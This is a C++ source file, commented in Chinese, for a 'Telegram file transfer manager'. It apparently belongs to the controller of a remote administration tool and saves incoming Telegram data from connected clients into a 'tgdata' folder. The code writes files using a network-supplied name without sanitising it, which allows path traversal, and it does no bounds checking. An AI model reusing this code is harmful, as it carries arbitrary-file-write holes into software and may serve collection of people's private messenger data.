#include "TelegramFileTransferManager.h"  
#include "macros.h"  

CTelegramFileTransferManager* CTelegramFileTransferManager::m_pInstance = NULL;  

CTelegramFileTransferManager* CTelegramFileTransferManager::GetInstance()  
{  
    if (m_pInstance == NULL)  
    {  
        m_pInstance = new CTelegramFileTransferManager();  
    }  
    return m_pInstance;  
}  

void CTelegramFileTransferManager::HandleTelegramFileTransfer(ClientContext* pContext)  
{  
    // 标记此连接正在进行传输  
    m_activeTransfers[pContext] = true;  
	
    // 处理文件传输  
    ProcessTelegramFile(pContext);  
}  

void CTelegramFileTransferManager::ProcessTelegramFile(ClientContext* pContext)  
{  
    // 解析数据包格式：[命令][文件大小高位][文件大小低位][文件名][文件数据]  
    LPBYTE lpBuffer = pContext->m_DeCompressionBuffer.GetBuffer(1);  
	
    // 获取文件大小信息  
    DWORD dwSizeHigh = *(DWORD*)lpBuffer;  
    DWORD dwSizeLow = *(DWORD*)(lpBuffer + 4);  
	
    // 获取文件名  
    char* fileName = (char*)(lpBuffer + 8);  
	
    // 构造保存路径  
    char szPath[MAX_PATH];  
    GetModuleFileName(NULL, szPath, MAX_PATH);  
    CString clientPath = szPath;  
    int pos = clientPath.ReverseFind('\\');  
    if (pos != -1) {  
        clientPath = clientPath.Left(pos + 1);  
    }  
	
    CString saveDir = clientPath + "tgdata\\";  
    CString savePath = saveDir + fileName;  
	
    // 确保目录存在  
    CreateDirectory(saveDir, NULL);  
	
    // 获取文件数据  
    int fileNameLen = strlen(fileName) + 1;  
    LPBYTE fileData = lpBuffer + 8 + fileNameLen;  
    DWORD dataSize = pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - 8 - fileNameLen;  
	
    // 创建并写入文件  
    HANDLE hFile = CreateFile(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);  
    if (hFile != INVALID_HANDLE_VALUE)  
    {  
        DWORD bytesWritten;  
        WriteFile(hFile, fileData, dataSize, &bytesWritten, NULL);  
        CloseHandle(hFile);  
    }  
	
    // 传输完成，移除标记  
    RemoveTransfer(pContext);  
}  

bool CTelegramFileTransferManager::IsTransferActive(ClientContext* pContext)  
{  
    return m_activeTransfers.find(pContext) != m_activeTransfers.end();  
}  

void CTelegramFileTransferManager::RemoveTransfer(ClientContext* pContext)  
{  
    m_activeTransfers.erase(pContext);  
}
